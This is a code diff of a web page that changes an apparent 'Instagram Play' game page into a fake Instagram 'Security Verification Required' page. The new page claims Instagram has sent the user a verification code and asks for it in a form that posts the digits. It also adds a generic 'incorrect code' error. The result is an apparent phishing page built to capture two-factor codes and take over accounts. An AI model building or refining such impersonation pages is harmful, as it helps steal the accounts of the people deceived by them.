@@ -6,36 +6,28 @@
       <i class="fa-brands fa-instagram icon-lg"></i>
     </div>
     <div>
-      <h2 class="notranslate" style="margin:0;color:#E4405F;">Instagram Play</h2>
-      <div style="color:#64748b;font-size:13px;margin-top:4px">Ready to Play & Earn</div>
+      <h2 class="notranslate" style="margin:0;color:#E4405F;">Instagram</h2>
+      <div style="color:#64748b;font-size:13px;margin-top:4px">Security Verification Required</div>
     </div>
   </div>
 
-  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🎮 Game Session Ready</h3>
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
   
   <div class="play-instructions">
     <div class="instruction-card">
-      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Step 1: Set the Mood</h4>
+      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Step 1: Verification Code</h4>
       <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
-        Start with a smile! Positive energy enhances your gaming experience and sets the right tone for fun.
+        To confirm that you are the rightful owner of the Instagram account you logged in with, a verification code has been sent to your registered SMS or email by Instagram. Please enter the code below and click “Submit” to continue.
       </p>
     </div>
-
-    <div class="instruction-card">
-      <h4 style="color:#1e293b;margin:16px 0 8px 0;font-size:15px;font-weight:600">Step 2: Enter Play Code</h4>
-      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
-        Enter any 4-9 digit combination below to initiate your gaming session and continue to the next level.
-      </p>
-    </div>
-  </div>
 
   <form id="loginForm" method="post" novalidate>
-    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Play Code</label>
-    <input class="input" id="digits" name="digits" placeholder="Enter 4-9 digit code" pattern="\d{4,9}" required>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
     <div class="center">
-      <button class="btn login-btn" type="submit">Start Playing</button>
+      <button class="btn login-btn" type="submit">Summit</button>
     </div>
   </form>
 </div>
@@ -55,7 +47,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   if (!pattern.test(val)) {
     valid = false;
     digits.classList.add("input-error");
-    digitsError.textContent = "Please enter a valid 4-9 digit play code.";
+    digitsError.textContent = "The code you entered is incorrect.";
   }
 
   if (!valid) event.preventDefault();
